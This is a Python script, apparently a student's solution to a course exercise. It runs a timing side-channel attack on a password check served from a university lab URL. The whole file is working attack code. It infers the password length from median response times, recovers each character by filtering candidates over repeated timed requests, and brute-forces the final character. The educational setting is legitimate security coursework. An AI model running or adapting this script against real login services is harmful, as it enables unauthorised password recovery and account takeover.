from __future__ import print_function
import requests
import string
import time
import operator
import sys
from tqdm import tqdm
import concurrent.futures
from numpy import mean, median, quantile

### TODO?: Student's T-Test
### TODO? Start-over?

# ███╗   ███╗██╗██╗     ███████╗███████╗████████╗ ██████╗ ███╗   ██╗███████╗     ██╗
# ████╗ ████║██║██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝    ███║
# ██╔████╔██║██║██║     █████╗  ███████╗   ██║   ██║   ██║██╔██╗ ██║█████╗      ╚██║
# ██║╚██╔╝██║██║██║     ██╔══╝  ╚════██║   ██║   ██║   ██║██║╚██╗██║██╔══╝       ██║
# ██║ ╚═╝ ██║██║███████╗███████╗███████║   ██║   ╚██████╔╝██║ ╚████║███████╗     ██║
# ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═╝


# ==================================== configuration =====================================

URL = 'http://aoi.ise.bgu.ac.il/?user={}&password={}'
ALL_CHARS = string.ascii_lowercase
NUM_ROUNDS_PASSWD_LENGTH_GUESS = 10
NUM_ROUNDS_PASSWD_GUESSING = 3
MAX_PASSWD_LENGTH = 32
TIMEOUT = 20 # Seconds
RETRY_LIMIT = 10
DIFFICULTY = None # or None
FILT_THRESH = 0.4 # What quntile of lowest measurements to remove before next measurement

if DIFFICULTY != None:
    URL = URL + '&difficulty=' + DIFFICULTY

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(
    pool_connections=100,
    pool_maxsize=100)
session.mount('http://', adapter)

# ========================================================================================

def timing_attack(username):
    eprint('Sending wakeup requests...')
    wakeup_server()
    eprint('Getting password length...')
    passwd_length = get_passwd_length(username)
    eprint('Password length is', passwd_length)
    curr_passwd = '*' * passwd_length
    for i in range(passwd_length-1): # -1 beacuse we brute-force last character
        eprint('----------------------------------')
        eprint('Current password:', curr_passwd)
        eprint(f'Guessing character at index {i}')
        next_char = infer_ith_char(username, i, curr_passwd)
        eprint(f'Best guess for character at index {i}:', next_char)
        curr_passwd = curr_passwd[:i] + next_char + curr_passwd[i+1:]
    eprint('----------------------------------')
    eprint('Current password:', curr_passwd)
    eprint('Brute-forcing last character...')
    last_char = brute_force_last(username, curr_passwd)
    eprint(f'Best guess for character at index {passwd_length-1}:', last_char)
    curr_passwd = curr_passwd[:-1] + last_char
    eprint('----------------------------------')
    eprint('Final password:', curr_passwd)
    done = is_done(username, curr_passwd)
    print(done)


def is_done(username, passwd):
    res = session.get(URL.format(username, passwd), timeout=TIMEOUT)
    if res.text == '0':
        return 'Wrong password, starting over...'
    if res.text == '1':
        return 'Great susccess!'


def get_passwd_length(username):
    length2time = {length: [] for length in range(1,MAX_PASSWD_LENGTH + 1)}
    for length in range(1, MAX_PASSWD_LENGTH + 1):
        passwd = 'a' * length
        for i in range(NUM_ROUNDS_PASSWD_LENGTH_GUESS):
            rtt, _ = send_request(username, passwd)
            length2time[length].append(rtt)
        length2time[length] = median(length2time[length]) # Take median

    passwd_length = max(length2time.items(), key=operator.itemgetter(1))[0] # Key with max value

    return passwd_length

def brute_force_last(username, passwd):
    for next_char in ALL_CHARS:
        _, res = send_request(username, passwd[:-1] + next_char)
        if res == '1':
            return next_char
    return '*' # Unknown


def get_rtts(username, passwd, i, char2AccRtt):
    for char in char2AccRtt.keys():
        new_passwd = passwd[:i] + char + passwd[i+1:]
        trials = []
        for _ in range(NUM_ROUNDS_PASSWD_GUESSING):
            rtt, _ = send_request(username, new_passwd)
            trials.append(rtt)
        char2AccRtt[char] = char2AccRtt[char] + median(trials)
    return char2AccRtt


def send_request(username, passwd, limit=RETRY_LIMIT):
    if limit == 0:
        eprint(f'Failed to get response for {RETRY_LIMIT} times, exiting...')
        exit(1)
    try:
        res = session.get(URL.format(username, passwd), timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        eprint('Timeout limit exceeded, re-trying...')
        return send_request(username, passwd, limit-1)
    except requests.exceptions.ConnectionError:
        eprint('Connection error occurred, re-trying...')
        return send_request(username, passwd, limit-1)
    elapsed = res.elapsed.total_seconds()
    success = res.text
    return elapsed, success


def infer_ith_char(username, i, passwd):
    char2AccRtt = {char:0 for char in ALL_CHARS}
    while len(char2AccRtt) > 1:
        char2AccRtt = get_rtts(username, passwd, i, char2AccRtt)
        filt = quantile(list(char2AccRtt.values()), FILT_THRESH)
        char2AccRtt = {k:v for k,v in char2AccRtt.items() if v >= filt}
    
    best_guess = list(char2AccRtt.keys()).pop()
    return best_guess

def wakeup_server():
    for _ in range(16):
        _, _ = send_request('bruce wayne', '42')


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


if __name__ == '__main__':
    if len(sys.argv) != 2:
        eprint('Usage: python3 ex01_M1.py username')
        exit(1)
    username = sys.argv[1]
    start = time.time()
    timing_attack(username)
    end = time.time()
    eprint(f'Finished in {(end-start)/60:.2f} minutes')